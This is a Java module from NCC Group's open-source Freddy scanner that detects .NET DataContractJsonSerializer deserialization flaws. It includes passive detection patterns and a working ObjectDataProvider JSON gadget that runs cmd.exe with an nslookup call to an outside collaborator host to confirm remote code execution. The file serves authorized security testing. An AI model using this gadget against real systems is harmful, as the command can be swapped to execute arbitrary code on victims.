// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET DataContractJsonSerializer
 * API.
 *
 * Note that, like DataContractSerializer, exploitation
 * relies on control of a type parameter to the
 * DataContractJsonSerializer constructor. If this can be
 * set to the following value then RCE is possible:
 *  -> System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class DataContractJsonSerializerModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private static final String OBJD_PREFIX = "{\"__type\":\"ObjectDataProvider:#System.Windows.Data\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"__type\":\"Process:#System.Diagnostics\",\"__identity\":\"\",\"StartInfo\":{\"__type\":\"ProcessStartInfo:#System.Diagnostics\",\"FileName\":\"cmd.exe\",\"Arguments\":\"/c ";
    private static final String OBJD_SUFFIX = "\"}}}";

    protected void initialiseModule() {
        setName("DataContractJsonSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
                "DataContractJsonSerializer constructor.");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))__type((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("DataContractJsonSerializer.ReadObject", IndicatorTarget.RESPONSE);

        //Register false positive to avoid firing issues for JavascriptSerializer targets
        registerPassiveScanFalsePositiveIndicator(new Pattern[]{Pattern.compile("Version"), Pattern.compile("Culture"), Pattern.compile("PublicKeyToken")}, IndicatorTarget.REQUEST);

        registerActiveScanExceptionPayload("{\"__type\":\"\"}", "DataContractJsonSerializer.ReadObject");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
